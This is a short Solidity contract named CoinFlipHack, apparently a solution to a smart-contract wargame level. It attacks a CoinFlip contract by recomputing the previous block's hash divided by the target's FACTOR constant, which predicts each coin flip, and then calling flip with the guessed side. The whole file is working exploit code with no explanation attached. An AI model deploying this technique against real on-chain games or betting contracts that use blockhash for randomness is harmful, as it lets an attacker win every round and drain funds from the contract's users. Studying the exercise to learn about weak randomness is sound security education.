// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;

import "./CoinFlip.sol";

contract CoinFlipHack {
    uint256 lastHash;
    uint256 FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;
    CoinFlip target;

    constructor(address _target) {
        target = CoinFlip(_target);
    }

    function attack() public {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        require(lastHash != blockValue);
        lastHash = blockValue;
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        target.flip(side);
    }
}
